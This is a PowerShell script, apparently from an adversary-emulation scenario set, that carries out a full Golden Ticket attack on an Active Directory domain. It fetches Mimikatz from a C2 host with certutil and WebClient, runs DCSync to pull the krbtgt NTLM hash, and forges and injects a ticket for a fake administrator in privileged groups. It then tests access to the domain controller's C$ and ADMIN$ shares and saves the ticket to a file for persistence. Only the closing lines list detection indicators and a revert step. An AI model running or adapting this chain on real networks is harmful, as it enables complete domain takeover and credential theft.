$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }
$TargetIP = if ($env:TARGET_IP) { $env:TARGET_IP } else { "192.168.1.10" }

# Input parameters (passed via environment or script params)
$KrbtgtHash = if ($env:KRBTGT_HASH) { $env:KRBTGT_HASH } else { "" }

Write-Host "[*] Starting Identity Attack - Golden Ticket (Mimikatz kerberos::golden)..." -ForegroundColor Cyan

# T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket
# Forges a TGT using the krbtgt account NTLM hash
# Grants unrestricted access to any resource in the domain
# Requires: krbtgt NTLM hash (obtained via DCSync)

Write-Host "[!] Requires: krbtgt NTLM hash (from DCSync), Domain SID" -ForegroundColor Yellow
Write-Host "[!] Target DC: $TargetIP" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
$mimikatzPath = "$stagingDir\mimikatz.exe"

# Step 1: Gather domain info
Write-Host "`n[*] [T1087.002] Gathering domain information for ticket forging..." -ForegroundColor Yellow

try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainName = $domain.Name
    $dcName = $domain.PdcRoleOwner.Name
    Write-Host "[+] Domain: $domainName" -ForegroundColor Green
    Write-Host "[+] PDC: $dcName" -ForegroundColor Green
} catch {
    $domainName = $env:USERDNSDOMAIN
    if (-not $domainName) { $domainName = "YOURDOMAIN.LOCAL" }
    Write-Host "[*] Domain from env: $domainName" -ForegroundColor Yellow
}

# Get Domain SID
Write-Host "`n[*] Retrieving Domain SID..."
Write-Host "    CMD: (Get-ADDomain).DomainSID"
try {
    $domainSID = (New-Object System.Security.Principal.NTAccount($env:USERDOMAIN, "krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
    $domainSID = $domainSID -replace "-502$", ""
    Write-Host "[+] Domain SID: $domainSID" -ForegroundColor Green
} catch {
    Write-Host "[*] Trying whoami method..." -ForegroundColor Yellow
    $whoamiSID = (whoami /user /fo csv | ConvertFrom-Csv).SID
    $domainSID = $whoamiSID -replace "-\d+$", ""
    Write-Host "[+] Domain SID: $domainSID" -ForegroundColor Green
}

# Step 2: Download Mimikatz
Write-Host "`n[*] [T1105] Downloading Mimikatz..." -ForegroundColor Yellow
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/mimikatz.exe $mimikatzPath"
certutil -urlcache -split -f "http://$C2Host/tools/mimikatz.exe" $mimikatzPath

if (-not (Test-Path $mimikatzPath)) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/mimikatz.exe", $mimikatzPath)
    } catch {
        Write-Host "[-] Download failed." -ForegroundColor Red
    }
}

if (Test-Path $mimikatzPath) {
    Write-Host "[+] Mimikatz staged successfully" -ForegroundColor Green

    if (-not $KrbtgtHash) {
        # Try DCSync to get krbtgt hash first
        Write-Host "`n[*] No krbtgt hash provided. Attempting DCSync to extract it..." -ForegroundColor Yellow
        Write-Host "    CMD: mimikatz.exe `"lsadump::dcsync /user:krbtgt`" `"exit`""
        $dcsyncOut = & $mimikatzPath "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit" 2>&1
        $dcsyncOut | ForEach-Object { Write-Host $_ }

        # Try to parse the hash from output
        $hashMatch = $dcsyncOut | Select-String "Hash NTLM:\s+([a-fA-F0-9]{32})"
        if ($hashMatch) {
            $KrbtgtHash = $hashMatch.Matches[0].Groups[1].Value
            Write-Host "[+] Extracted krbtgt NTLM hash: $KrbtgtHash" -ForegroundColor Green
        } else {
            Write-Host "[-] Could not extract krbtgt hash. Provide it via input parameter." -ForegroundColor Red
            Write-Host "[!] Run DCSync first: scenarios/identity_attacks/dcsync.ps1" -ForegroundColor Yellow
        }
    }

    if ($KrbtgtHash) {
        # Step 3: Forge Golden Ticket
        $spoofUser = "GoldenAdmin"
        $userId = "500"

        Write-Host "`n[*] [T1558.001] Forging Golden Ticket..." -ForegroundColor Yellow
        Write-Host "    Domain:    $domainName"
        Write-Host "    SID:       $domainSID"
        Write-Host "    User:      $spoofUser (RID $userId)"
        Write-Host "    krbtgt:    $KrbtgtHash"

        $goldenCmd = "kerberos::golden /user:$spoofUser /domain:$domainName /sid:$domainSID /krbtgt:$KrbtgtHash /id:$userId /groups:512,513,518,519,520 /ptt"
        Write-Host "    CMD: mimikatz.exe `"$goldenCmd`" `"exit`""

        & $mimikatzPath "privilege::debug" $goldenCmd "exit" 2>&1

        # Step 4: Verify ticket injection
        Write-Host "`n[*] Verifying injected Golden Ticket..." -ForegroundColor Yellow
        Write-Host "    CMD: klist"
        klist 2>&1

        # Step 5: Test access with forged ticket
        Write-Host "`n[*] [T1021.002] Testing access to DC with Golden Ticket..." -ForegroundColor Yellow
        Write-Host "    CMD: dir \\$TargetIP\C$"
        dir "\\$TargetIP\C$" 2>&1

        Write-Host "`n[*] Testing admin share access..." -ForegroundColor Yellow
        Write-Host "    CMD: dir \\$TargetIP\ADMIN$"
        dir "\\$TargetIP\ADMIN$" 2>&1

        # Save ticket to file for persistence
        Write-Host "`n[*] Exporting Golden Ticket to file..." -ForegroundColor Yellow
        $ticketFile = "$stagingDir\golden_ticket.kirbi"
        $exportCmd = "kerberos::golden /user:$spoofUser /domain:$domainName /sid:$domainSID /krbtgt:$KrbtgtHash /id:$userId /groups:512,513,518,519,520 /ticket:$ticketFile"
        & $mimikatzPath $exportCmd "exit" 2>&1
        
        if (Test-Path $ticketFile) {
            Write-Host "[+] Golden Ticket saved: $ticketFile" -ForegroundColor Green
        }
    }
} else {
    Write-Host "[-] Cannot execute - Mimikatz not available" -ForegroundColor Red
    Write-Host "[!] Ensure http://$C2Host/tools/mimikatz.exe is accessible" -ForegroundColor Yellow
}

Write-Host "`n[+] Golden Ticket Attack Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: TGT with abnormal lifetime, 4768 events, 4769 events, Mimikatz execution" -ForegroundColor Yellow
Write-Host "[!] Key Indicators: Ticket lifetime > 10 hours, non-existent username, abnormal group memberships" -ForegroundColor Yellow
Write-Host "[!] Revert: Run klist purge or use the revert script to clear forged tickets" -ForegroundColor Yellow
